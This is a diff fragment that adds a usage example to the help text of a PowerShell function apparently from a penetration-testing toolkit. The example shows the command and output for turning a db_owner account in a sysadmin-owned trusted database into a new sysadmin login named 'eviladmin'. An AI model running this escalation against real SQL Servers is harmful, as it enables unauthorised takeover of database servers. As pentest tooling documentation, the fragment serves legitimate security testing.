@@ -23,6 +23,19 @@ function Invoke-SqlServerDbElevateDbOwner
 	   [*] Success! - myappuser is now a sysadmin.
 	   [*] All done.
 
+	.EXAMPLE
+	   Creating new sysadmin, using a user that has the db_owner role in a trusted database owned by a sysadmin.
+	   PS C:\> Invoke-SqlServerDbElevateDbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance SQLServer1\SQLEXPRESS -newuser eviladmin -newPass MyPassword!
+	   [*] Attempting to Connect to SQLServer1\SQLEXPRESS as myappuser...
+	   [*] Connected.
+	   [*] Enumerating accessible trusted databases owned by sysadmins...
+	   [*] Found 2 trusted databases owned by a sysadmin.
+	   [*] Checking if myappuser the has db_owner role in any of them...
+	   [*] myappuser has db_owner role in 1 of the databases.
+	   [*] Attempting to create and add eviladmin to the sysadmin role via the MyAppDb database...
+	   [*] Success! - eviladmin is now a sysadmin.
+	   [*] All done.
+
 	.LINK
 	   http://www.netspi.com
 
